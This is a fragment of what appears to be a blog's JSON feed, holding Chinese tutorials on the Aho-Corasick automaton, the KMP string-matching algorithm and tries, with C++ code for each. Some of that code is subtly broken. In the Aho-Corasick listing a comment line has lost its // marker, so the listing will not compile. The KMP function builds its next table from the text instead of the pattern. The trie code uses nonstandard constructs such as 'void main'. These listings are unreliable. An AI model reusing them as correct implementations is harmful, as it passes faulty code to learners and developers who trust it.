            "date_published": "2023-01-13T20:00:23.000Z",
            "content_html": "<p>首先给定模式串 &quot;ash&quot;,&quot;shex&quot;,&quot;bcd&quot;,&quot;sha&quot;, 然后我们根据模式串建立如下 trie 树:<br>\n<img data-src=\"https://img-blog.csdn.net/20181006092249946?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt></p>\n<p>然后我们再了解下一步:<br>\nac 自动机，就是在 tire 树的基础上，增加一个 fail 指针，如果当前点匹配失败，则将指针转移到 fail 指针指向的地方，这样就不用回溯，而可以路匹配下去了.(当前模式串后缀和 fail 指针指向的模式串部分前缀相同，如 abce 和 bcd, 我们找到 c 发现下一个要找的不是 e, 就跳到 bcd 中的 c 处，看看此处的下一个字符 (d) 是不是应该找的那一个)</p>\n<p>一般，fail 指针的构建都是用 bfs 实现的<br>\n首先每个模式串的首字母肯定是指向根节点的</p>\n<p><img data-src=\"https://img-blog.csdn.net/20181006092859165?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt></p>\n<p>现在第一层 bfs 遍历完了，开始第二层<br>\n (根节点为第 0 层) 第二层 a 的子节点为 s, 但是我们还是要从 a-z 遍历，如果不存在这个子节点我们就让他指向根节点 (如下图红色的 a)</p>\n<p><img data-src=\"https://img-blog.csdn.net/20181006093044472?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt></p>\n<p>当我们遍历到 s 的时候，由于存在 s 这个节点，我们就让他的 fail 指针指向他父亲节点 (a) 的 fail 指针指向的那个节点 (根) 的具有相同字母的子节点 (第一层的 s), 也就是这样</p>\n<p><img data-src=\"https://img-blog.csdn.net/20181006093334238?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt></p>\n<p>按照相同规律构建第二层后，到了第三层的 h 点，还是按照上面的规则，我们找到 h 的父亲节点 (s) fail 指针指向的那个位置 (第一层的 s) 然后指向它所指向的相同字母根 -&gt;s-&gt;h 的这个链的 h 节点，如下图</p>\n<p><img data-src=\"https://img-blog.csdn.net/20181006093412877?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt></p>\n<p>完全构造好后的树</p>\n<p><img data-src=\"https://img-blog.csdn.net/2018100609362045?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt></p>\n<p>然后匹配就很简单了，这里以 ashe 为例<br>\n我们先用 ash 匹配，到 h 了发现：诶这里 ash 是一个完整的模式串，好的 ans++, 然后找下一个 e, 可是 ash 后面没字母了啊，我们就跳到 hfail 指针指向的那个 h 继续找，还是没有？再跳，结果当前的 h 指向的是根节点，又从根节点找，然而还是没有找到 e, 程序 END</p>\n<p>过程如下图</p>\n<p><img data-src=\"https://img-blog.csdn.net/20181006093706548?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jlc3Rzb3J0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt></p>\n<p>喜闻乐见模板系列<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">#include &lt;queue&gt;</span><br><span class=\"line\">#include &lt;cstdlib&gt;</span><br><span class=\"line\">#include &lt;cmath&gt;</span><br><span class=\"line\">#include &lt;cstdio&gt;</span><br><span class=\"line\">#include &lt;string&gt;</span><br><span class=\"line\">#include &lt;cstring&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;algorithm&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">typedef long long ll;</span><br><span class=\"line\">const int maxn =  2*1e6+9;</span><br><span class=\"line\"></span><br><span class=\"line\">int trie[maxn][26]; //字典树</span><br><span class=\"line\">int cntword[maxn];  //记录该单词出现次数</span><br><span class=\"line\">int fail[maxn];     //失败时的回溯指针</span><br><span class=\"line\">int cnt = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">void insertWords(string s)&#123;</span><br><span class=\"line\">    int root = 0;</span><br><span class=\"line\">    for(int i=0;i&lt;s.size();i++)&#123;</span><br><span class=\"line\">        int next = s[i] - &#x27;a&#x27;;</span><br><span class=\"line\">        if(!trie[root][next])</span><br><span class=\"line\">            trie[root][next] = ++cnt;</span><br><span class=\"line\">        root = trie[root][next];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    cntword[root]++;      //当前节点单词数+1</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void getFail()&#123;</span><br><span class=\"line\">    queue &lt;int&gt;q;</span><br><span class=\"line\">    for(int i=0;i&lt;26;i++)&#123;      //将第二层所有出现了的字母扔进队列</span><br><span class=\"line\">        if(trie[0][i])&#123;</span><br><span class=\"line\">            fail[trie[0][i]] = 0;</span><br><span class=\"line\">            q.push(trie[0][i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//fail[now]    -&gt;当前节点now的失败指针指向的地方</span><br><span class=\"line\">tire[now][i] -&gt; 下一个字母为i+&#x27;a&#x27;的节点的下标为tire[now][i]</span><br><span class=\"line\">    while(!q.empty())&#123;</span><br><span class=\"line\">        int now = q.front();</span><br><span class=\"line\">        q.pop();</span><br><span class=\"line\"></span><br><span class=\"line\">        for(int i=0;i&lt;26;i++)&#123;      //查询26个字母</span><br><span class=\"line\">            if(trie[now][i])&#123;</span><br><span class=\"line\">                //如果有这个子节点为字母i+&#x27;a&#x27;,则</span><br><span class=\"line\">//让这个节点的失败指针指向(((他父亲节点)的失败指针所指向的那个节点)的下一个节点)</span><br><span class=\"line\">                //有点绕,为了方便理解特意加了括号</span><br><span class=\"line\"></span><br><span class=\"line\">                fail[trie[now][i]] = trie[fail[now]][i];</span><br><span class=\"line\">                q.push(trie[now][i]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            else//否则就让当前节点的这个子节点</span><br><span class=\"line\">                //指向当前节点fail指针的这个子节点</span><br><span class=\"line\">                trie[now][i] = trie[fail[now]][i];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int query(string s)&#123;</span><br><span class=\"line\">    int now = 0,ans = 0;</span><br><span class=\"line\">    for(int i=0;i&lt;s.size();i++)&#123;    //遍历文本串</span><br><span class=\"line\">        now = trie[now][s[i]-&#x27;a&#x27;];  //从s[i]点开始寻找</span><br><span class=\"line\">        for(int j=now;j &amp;&amp; cntword[j]!=-1;j=fail[j])&#123;</span><br><span class=\"line\">            //一直向下寻找,直到匹配失败(失败指针指向根或者当前节点已找过).</span><br><span class=\"line\">            ans += cntword[j];</span><br><span class=\"line\">            cntword[j] = -1;    //将遍历国后的节点标记,防止重复计算</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">    int n;</span><br><span class=\"line\">    string s;</span><br><span class=\"line\">    cin &gt;&gt; n;</span><br><span class=\"line\">    for(int i=0;i&lt;n;i++)&#123;</span><br><span class=\"line\">        cin &gt;&gt; s ;</span><br><span class=\"line\">        insertWords(s);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fail[0] = 0;</span><br><span class=\"line\">    getFail();</span><br><span class=\"line\">    cin &gt;&gt; s ;</span><br><span class=\"line\">    cout &lt;&lt; query(s) &lt;&lt; endl;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/14/CPP%E7%9A%84KMP%E7%AE%97%E6%B3%95/",
            "url": "https://mangpumo.github.io/2023/01/14/CPP%E7%9A%84KMP%E7%AE%97%E6%B3%95/",
            "title": "CPP的KMP算法",
            "date_published": "2023-01-13T19:50:50.000Z",
            "content_html": "<h1 id=\"1kmp算法简介\"><a class=\"anchor\" href=\"#1kmp算法简介\">#</a> 1.kmp 算法简介</h1>\n<p>KMP 是三位大牛：D.E.Knuth、J.H.Morris 和 V.R.Pratt 同时发现的。<br>\nKMP 算法其实就是一种改进的字符串匹配算法，关键是利用匹配后失败的信息，尽量减少模式串（W）与主串（T）的匹配次数以达到快速匹配的目的。具体实现就是实现一个 next () 函数，函数本身包含了模式串的局部匹配信息。时间复杂度 O (m+n)。<br>\n如果考虑最笨的方法，我们可以将 T [0] 和 W [0] 进行匹配，如果相同则匹配下一个字符，直到出现不相同的情况，此时我们会丢弃前面的匹配信息，然后把 T [1] 跟 W [0] 匹配，循环进行，直到主串结束，或者出现匹配成功的情况。这种丢弃前面的匹配信息的方法，时间复杂度为 O (m*n)。<br>\nKMP 算法利用已经部分匹配这个有效信息，保持 i 指针（主串）不回溯，通过修改 j 指针，让模式串尽量地移动到有效的位置，具体可见下面一个例子。<br>\n如果主串为：a b c a b c d h i j k<br>\n 模式串为：a b c e<br>\n 当我们匹配到主串的第四个字符 a 时，可知 a 和 e 不相等，因此需要移向下一位，但其实我们并不需要从模式串中的第一位重新开始比较，因为主串中的前三个字符已经没有未匹配的 a 了，不可能匹配成功。</p>\n<p><img data-src=\"https://i.loli.net/2018/01/30/5a706e671dc4d.jpg\" alt></p>\n<h1 id=\"2next函数\"><a class=\"anchor\" href=\"#2next函数\">#</a> 2.next（）函数</h1>\n<p>因此，最关键的是找到如何移动 j 指针。我们记当匹配失败时，j 要移动的下一个位置为 k（即 next [j]= k)。记 P 为模式串。<br>\n很显然，存在这样一个性质：最前面的 k 个位置（对于模式串来说）和 j 之前的最后 k 个字符（主串）是一样的。因此得到公式：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">P[0 ~ k-1] == P[j-k ~ j-1]</span><br></pre></td></tr></table></figure></p>\n<p>当 P [k] == p [j] 时</p>\n<p>有 P [0 ~ k-1] + P [k] == p [j-k ~ j-1] + P [j]，即：P [0 ~ k] == P [j-k ~ j]，因此可得<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">next[j+1] == k + 1 == next[j] + 1</span><br></pre></td></tr></table></figure></p>\n<p>当 P [k] != p [j] 时</p>\n<p>我们只能在 0~k-1 中去寻找最长后缀串了，因此为<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">k = next[k]</span><br></pre></td></tr></table></figure></p>\n<p>使用 C++ 实现 next 函数为<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int* getNext(string p)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int* next = new int[p.length()];</span><br><span class=\"line\">    next[0] = -1;           //while the first char not match, i++,j++</span><br><span class=\"line\">    int j = 0;</span><br><span class=\"line\">    int k = -1;</span><br><span class=\"line\">    while (j &lt; (int)p.length() - 1)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if (k == -1 || p[j] == p[k])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            j++;</span><br><span class=\"line\">            k++;</span><br><span class=\"line\">            next[j] = k;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            k = next[k];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return next;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"3完整算法\"><a class=\"anchor\" href=\"#3完整算法\">#</a> 3. 完整算法</h1>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int KMP(string T,string p)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int i=0;</span><br><span class=\"line\">    int j=0;</span><br><span class=\"line\">    int* next=getNext(T);</span><br><span class=\"line\">    while (i &lt; (int)T.length() &amp;&amp; j &lt; (int)p.length())</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if (j == -1 || T[i] == p[j])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            i++;</span><br><span class=\"line\">            j++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            j=next[j];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (j == (int)p.length())</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return i-j;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return -1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/14/%E5%AD%97%E5%85%B8%E6%A0%91%E5%8F%8A%E5%85%B6CPP%E5%AE%9E%E7%8E%B0/",
            "url": "https://mangpumo.github.io/2023/01/14/%E5%AD%97%E5%85%B8%E6%A0%91%E5%8F%8A%E5%85%B6CPP%E5%AE%9E%E7%8E%B0/",
            "title": "字典树及其CPP实现",
            "date_published": "2023-01-13T19:46:08.000Z",
            "content_html": "<h1 id=\"1-什么是trie树参考\"><a class=\"anchor\" href=\"#1-什么是trie树参考\">#</a> 1、什么是 Trie 树（参考）</h1>\n<p>rie 树，即字典树，又称单词查找树或键树，是一种树形结构，是一种哈希树的变种。典型应用是用于统计和排序大量的字符串（但不仅限于字符串），所以经常被搜索引擎系统用于文本词频统计。它的优点是：最大限度地减少无谓的字符串比较，查询效率比哈希表高。Trie 的核心思想是空间换时间。利用字符串的公共前缀来降低查询时间的开销以达到提高效率的目的。</p>\n<h2 id=\"字典树3个基本性质\"><a class=\"anchor\" href=\"#字典树3个基本性质\">#</a> 字典树 3 个基本性质：</h2>\n<ul>\n<li>根节点不包含字符，除根节点外每一个节点都只包含一个字符。</li>\n<li>从根节点到某一节点，路径上经过的字符连接起来，为该节点对应的字符串。</li>\n<li>每个节点的所有子节点包含的字符都不相同。</li>\n</ul>\n<p>假设有 b，abc，abd，bcd，abcd，efg，hii 这 6 个单词，我们构建的树就是如下图这样的：<br>\n<img data-src=\"https://img-blog.csdnimg.cn/20190408163008821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01PVV9JVA==,size_16,color_FFFFFF,t_70\" alt></p>\n<p>如上图所示，对于每一个节点，从根遍历到他的过程就是一个单词，如果这个节点被标记为红色，就表示这个单词存在，否则不存在。那么，对于一个单词，我只要顺着他从根走到对应的节点，再看这个节点是否被标记为红色就可以知道它是否出现过了。把这个节点标记为红色，就相当于插入了这个单词。这样一来我们查询和插入可以一起完成，所用时间仅仅为单词长度，在这一个样例，便是 10。我们可以看到，trie 树每一层的节点数是 26^i 级别的。所以为了节省空间。我们用动态链表，或者用数组来模拟动态。空间的花费，不会超过单词数 × 单词长度。</p>\n<h2 id=\"字典树的查询\"><a class=\"anchor\" href=\"#字典树的查询\">#</a> 字典树的查询：</h2>\n<p>使用 trie 时，因为当查询如字符串 abc 是否为某个字符串的前缀时，显然以 b,c,d.... 等不是以 a 开头的字符串就不用查找了。所以建立 trie 的复杂度为 O (n<em>len)，而建立 + 查询在 trie 中是可以同时执行的，建立的过程也就可以成为查询的过程，hash 就不能实现这个功能。所以总的复杂度为 O (n</em>len)，实际查询的复杂度也只是 O (len)。（说白了，就是 Trie 树的平均高度 h 为 len，所以 Trie 树的查询复杂度为 O（h）=O（len））。</p>\n<h2 id=\"字典树优缺点\"><a class=\"anchor\" href=\"#字典树优缺点\">#</a> 字典树优缺点：</h2>\n<h3 id=\"优点\"><a class=\"anchor\" href=\"#优点\">#</a> 优点：</h3>\n<ul>\n<li>插入，查询，删除等操作复杂度为 O (h), 其中 h 为单词的长度。为什么会这么快呢，本质是空间换时间（空间复杂度为 26 的 h 次方），利用指针来避免做其他不必要的查找。（初始化的时间复杂度为 n*O (h)，n 为单词个数）；</li>\n<li>当储存大量单词或者说储存的单词有着共同前缀时节省了空间。（比如说用线性存储 boy,boyfriend 如用 trie 存储的差别）；</li>\n</ul>\n<h3 id=\"缺点\"><a class=\"anchor\" href=\"#缺点\">#</a> 缺点：</h3>\n<ul>\n<li>指针占用的空间，空间复杂度大。如果储存少量的单词，并不能节省空间</li>\n</ul>\n<h2 id=\"字典树的应用\"><a class=\"anchor\" href=\"#字典树的应用\">#</a> 字典树的应用：</h2>\n<ul>\n<li>字符串检索：事先将已知的一些字符串（字典）的有关信息保存到 trie 树里，查找另外一些未知字符串是否出现过或者出现频率。</li>\n<li>字符串最长公共前缀（转化为寻找共同祖先问题）。</li>\n</ul>\n<h2 id=\"字典树和哈希表的比较参考\"><a class=\"anchor\" href=\"#字典树和哈希表的比较参考\">#</a> 字典树和哈希表的比较（参考）：</h2>\n<p><img data-src=\"https://img-blog.csdnimg.cn/20190408165347185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01PVV9JVA==,size_16,color_FFFFFF,t_70\" alt></p>\n<h1 id=\"2-字典树的c实现参考\"><a class=\"anchor\" href=\"#2-字典树的c实现参考\">#</a> 2、字典树的 C++ 实现（参考）</h1>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;string&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"> </span><br><span class=\"line\">const int Num = 26;             //每个节点需要保存26个字母</span><br><span class=\"line\"> </span><br><span class=\"line\">struct TrieNode</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    bool Isword;                //判断是否是单词</span><br><span class=\"line\">    TrieNode* next[Num];</span><br><span class=\"line\">    TrieNode() :Isword(false)   //初始化</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        memset(next, NULL, sizeof(next));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\">class Trie</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">    Trie() &#123; root = new TrieNode(); &#125;</span><br><span class=\"line\">    void insert(string word);</span><br><span class=\"line\">    bool search(string word);</span><br><span class=\"line\">    void deleteTrie(TrieNode* root);</span><br><span class=\"line\">private:</span><br><span class=\"line\">    TrieNode* root;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\">void Trie::insert(string word)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    TrieNode* location = root;</span><br><span class=\"line\">    for (int i = 0; i &lt; word.length();i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if (location-&gt;next[word[i] - &#x27;a&#x27;] == nullptr)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            TrieNode* temp = new TrieNode();</span><br><span class=\"line\">            location-&gt;next[word[i] - &#x27;a&#x27;]=temp;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        location = location-&gt;next[word[i] - &#x27;a&#x27;];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    location-&gt;Isword = true;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">bool Trie::search(string word)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    TrieNode* location = root;</span><br><span class=\"line\">    //while (word&amp;&amp;location)//注意location不能为空</span><br><span class=\"line\">    for (int i = 0; i &lt; word.length()&amp;&amp;location;i++)</span><br><span class=\"line\">        location = location-&gt;next[word[i] - &#x27;a&#x27;];</span><br><span class=\"line\">    return(location != NULL &amp;&amp; location-&gt;Isword);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">void Trie::deleteTrie(TrieNode* root)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    for (int i = 0; i &lt; Num; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if (root-&gt;next[i] != NULL)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            deleteTrie(root-&gt;next[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    delete root;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">void main()                     //简单测试  </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Trie tree;</span><br><span class=\"line\">    int n;                      //输入n个单词在字典树中</span><br><span class=\"line\">    cin &gt;&gt; n;</span><br><span class=\"line\">    while (n--)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        string s;</span><br><span class=\"line\">        cin &gt;&gt; s;</span><br><span class=\"line\">        tree.insert(s);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    string input;</span><br><span class=\"line\">    cout &lt;&lt; &quot;输入要检查的单词&quot; &lt;&lt; endl;</span><br><span class=\"line\">    cin &gt;&gt; input;</span><br><span class=\"line\">    cout &lt;&lt; boolalpha &lt;&lt; tree.search(input) &lt;&lt; endl;//查找是否存在是个单词</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/14/CPP%E6%A0%91/",
            "url": "https://mangpumo.github.io/2023/01/14/CPP%E6%A0%91/",
            "title": "CPP树",
            "date_published": "2023-01-13T19:27:09.000Z",
